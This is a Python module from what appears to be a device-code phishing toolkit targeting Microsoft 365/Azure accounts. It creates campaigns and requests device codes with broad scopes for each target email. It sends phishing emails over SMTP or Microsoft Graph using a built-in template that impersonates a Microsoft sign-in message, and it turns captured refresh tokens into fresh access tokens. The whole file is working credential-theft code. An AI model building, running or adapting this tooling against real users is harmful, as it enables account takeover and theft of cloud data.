"""Campaign and device code session creation + email sending."""
from datetime import datetime, timedelta
import secrets
from app import db
from app.models import Campaign, DeviceCodeSession, SMTPConfig, AzureAppConfig
from app.device_code import (
    request_device_code,
    get_client_credentials_token,
    FULL_SCOPE,
)
from app.email_sender import send_phish_email, send_phish_email_via_graph
from app.notification_sender import send_session_notification


def get_effective_device_code_config(campaign):
    """
    Resolve which tenant/client_id to use for device code flow for this campaign.
    Uses campaign.public_client_id (e.g. Azure CLI or PowerShell public client ID).
    """
    tenant_id = "organizations"
    client_id = (campaign.public_client_id or "").strip()
    if not client_id:
        raise ValueError(
            "No public client_id configured for this campaign. Edit the campaign and set the device code client_id (e.g. Azure CLI or PowerShell)."
        )
    return tenant_id, client_id


def create_campaign(name, email_delivery_method="none", smtp_config_id=None,
                    azure_email_config_id=None, azure_email_from=None, email_subject=None,
                    email_body_html=None, extra_scopes=None, public_client_id=None):
    """Create a campaign in draft state. Sessions = number of emails when launching."""
    c = Campaign(
        name=name or f"Campaign {datetime.utcnow().strftime('%Y-%m-%d %H:%M')}",
        email_delivery_method=email_delivery_method or "none",
        smtp_config_id=smtp_config_id if email_delivery_method == "smtp" else None,
        azure_email_config_id=azure_email_config_id if email_delivery_method == "azure" else None,
        azure_email_from=azure_email_from if email_delivery_method == "azure" else None,
        email_subject=email_subject,
        email_body_html=email_body_html,
        extra_scopes=(extra_scopes or "").strip() or None,
        public_client_id=public_client_id,
        target_count=0,
        status="draft",
    )
    # Always generate a random per-campaign API path segment so the API link is available.
    if not c.api_path:
        c.api_path = secrets.token_hex(16)
    db.session.add(c)
    db.session.commit()
    return c


def launch_campaign(campaign_id, target_emails):
    """
    For each target email: request a device code, create a session, optionally send email.
    Sets campaign status to 'running'.
    """
    campaign = Campaign.query.get(campaign_id)
    if not campaign:
        return None, "Campaign not found"
    try:
        tenant_id, client_id = get_effective_device_code_config(campaign)
    except ValueError as e:
        return None, str(e)

    email_method = (campaign.email_delivery_method or "none").lower()
    smtp_config = None
    graph_token = None

    # If this campaign is configured to use SMTP, load its SMTP config so we can
    # both send mail and correctly decide whether to show a "no SMTP config" warning.
    if email_method == "smtp" and campaign.smtp_config_id:
        smtp_config = SMTPConfig.query.get(campaign.smtp_config_id)

    try:
        tok = get_client_credentials_token(
            tenant_id,
            "https://management.azure.com/.default",
        )
        access_token = tok.get("access_token")
    except Exception:
        access_token = None

    campaign.status = "running"
    db.session.commit()

    # Warn if user expected email but none will be sent
    email_warning = None
    if email_method == "smtp":
        if not campaign.smtp_config_id or not smtp_config:
            email_warning = "No SMTP config selected for this campaign – no emails sent. Edit campaign, set Email delivery to 'Use SMTP', and select an SMTP config."
        elif not smtp_config.is_active:
            email_warning = "SMTP config is inactive – no emails sent. Activate it in SMTP Config."

    created = 0
    errors = []
    for email in target_emails:
        email = (email or "").strip()
        if not email:
            continue
        try:
            # Use full scope (like az login --use-device-code) so refresh token works for ARM, Key Vault, Graph, Storage
            scope = FULL_SCOPE
            extra = (campaign.extra_scopes or "").strip()
            if extra:
                scope = f"{scope} {extra}".strip()
            resp = request_device_code(
                tenant_id,
                client_id,
                scope,
            )
            expires_in = resp.get("expires_in", 900)
            session = DeviceCodeSession(
                campaign_id=campaign_id,
                target_email=email,
                user_code=resp.get("user_code"),
                device_code=resp.get("device_code"),
                verification_uri=resp.get("verification_uri", "https://microsoft.com/devicelogin"),
                message=resp.get("message", ""),
                expires_at=datetime.utcnow() + timedelta(seconds=expires_in),
                status="pending",
            )
            db.session.add(session)
            db.session.commit()
            # Notify about new session creation.
            send_session_notification(session, event="session_created")

            if email_method == "smtp" and smtp_config and smtp_config.is_active:
                send_phish_email(
                    smtp_config,
                    to_email=email,
                    subject=campaign.email_subject or "Sign in to your account",
                    body_html=campaign.email_body_html or get_default_email_body(),
                    user_code=session.user_code,
                    verification_uri=session.verification_uri,
                    message_display=session.message,
                    from_name=smtp_config.from_name,
                )
                session.email_sent = True
                session.email_sent_at = datetime.utcnow()
                db.session.commit()
            elif email_method == "azure" and access_token and campaign.azure_email_from:
                send_phish_email_via_graph(
                    access_token,
                    campaign.azure_email_from,
                    email,
                    campaign.email_subject or "Sign in to your account",
                    campaign.email_body_html or get_default_email_body(),
                    session.user_code,
                    session.verification_uri,
                    session.message,
                )
                session.email_sent = True
                session.email_sent_at = datetime.utcnow()
                db.session.commit()
            created += 1
        except Exception as e:
            errors.append(f"{email}: {str(e)}")

    # If all sessions created, we could set status to running; already set above.
    msg = None
    if email_warning:
        msg = email_warning
    if errors:
        msg = (msg + " " if msg else "") + "Send errors: " + "; ".join(errors[:10])
    return campaign, msg


def get_default_email_body():
    return """<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Sign in to Microsoft</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f6f8;font-family:Arial, Helvetica, sans-serif;">

  <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f6f8;padding:40px 0;">
    <tr>
      <td align="center">

        <table width="600" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:8px;padding:40px;">
          
          <tr>
            <td style="text-align:center;font-size:24px;font-weight:bold;color:#333;">
              Sign in to your Microsoft account
            </td>
          </tr>

          <tr>
            <td style="padding-top:20px;font-size:16px;color:#555;text-align:center;">
              Use the verification code below to continue signing in.
            </td>
          </tr>
          <tr>
            <td style="padding:30px 0;text-align:center;">
              <span style="
                display:inline-block;
                font-size:28px;
                letter-spacing:4px;
                font-weight:bold;
                color:#0078D4;
                background:#f0f6ff;
                padding:12px 24px;
                border-radius:6px;
              ">
                {{user_code}}
              </span>
            </td>
          </tr>
          <tr>
            <td style="text-align:center;font-size:15px;color:#666;">
              Or click the button below to sign in directly.
            </td>
          </tr>

          <tr>
            <td align="center" style="padding:25px 0;">
              <a href="{{verification_uri}}" 
                style="
                  background:#0078D4;
                  color:#ffffff;
                  text-decoration:none;
                  padding:12px 28px;
                  border-radius:6px;
                  font-size:16px;
                  display:inline-block;
                  font-weight:bold;
                ">
                Sign in
              </a>
            </td>
          </tr>
          <tr>
            <td style="border-top:1px solid #eee;padding-top:20px;font-size:13px;color:#888;text-align:center;">
              If you didn't request this, you can safely ignore this email.
            </td>
          </tr>

        </table>

      </td>
    </tr>
  </table>

</body>
</html>
    """


def get_access_token_from_refresh(captured_token_id, scope=None):
    """Use stored refresh token to get a new access token. scope: optional resource scope (e.g. ARM, Graph, Key Vault)."""
    from app.models import CapturedToken
    from app.device_code import refresh_access_token
    token = CapturedToken.query.get(captured_token_id)
    if not token or not token.refresh_token:
        return None, "Token not found or no refresh token"
    session = token.session
    campaign = session.campaign
    tenant_id, _client_id = get_effective_device_code_config(campaign)
    try:
        data = refresh_access_token(
            tenant_id,
            token.refresh_token,
            scope=scope,
        )
        token.access_token = data.get("access_token")
        expires_in = data.get("expires_in")
        if expires_in:
            token.access_token_expires_at = datetime.utcnow() + timedelta(seconds=expires_in)
        db.session.commit()
        return {
            "access_token": data.get("access_token"),
            "expires_in": expires_in,
            "scope": data.get("scope"),
        }, None
    except Exception as e:
        msg = str(e)
        if hasattr(e, "response") and e.response is not None:
            try:
                body = e.response.json()
                msg = body.get("error_description") or body.get("error") or msg
            except Exception:
                pass
        return None, msg
